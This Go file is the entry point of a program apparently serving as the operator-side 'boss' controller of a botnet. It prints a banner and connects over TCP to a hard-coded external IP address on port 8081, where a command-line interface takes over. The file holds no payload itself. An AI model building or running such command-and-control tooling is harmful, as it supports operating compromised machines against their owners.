package main

import (
	"bytes"
	"flag"
	"log"

	"github.com/dimiro1/banner"
	colorable "github.com/mattn/go-colorable"
	"github.com/phanletrunghieu/bot-net/boss/service/cli"
	"github.com/phanletrunghieu/bot-net/boss/service/tcp"
)

func main() {
	serverPtr := flag.String("s", "13.59.185.252", "server address")
	flag.Parse()

	welcome := "\r\n    __  ___            ____           ______           _ \r\n   / / / (_)__  __  __/ __ \\___  ____/_  __/________ _(_)\r\n  / /_/ / / _ \\/ / / / / / / _ \\/ __ \\/ / / ___/ __ `/ / \r\n / __  / /  __/ /_/ / /_/ /  __/ /_/ / / / /  / /_/ / /  \r\n/_/ /_/_/\\___/\\__,_/_____/\\___/ .___/_/ /_/   \\__,_/_/   \r\n                             /_/                         \r\n"
	isEnabled := true
	isColorEnabled := true
	banner.Init(colorable.NewColorableStdout(), isEnabled, isColorEnabled, bytes.NewBufferString(welcome))

	bossService := tcp.NewTCPService(*serverPtr, 8081)
	go func() {
		err := <-bossService.Error
		log.Println(err)
	}()

	go bossService.Run()

	cli.ExecuteMain(bossService)
}
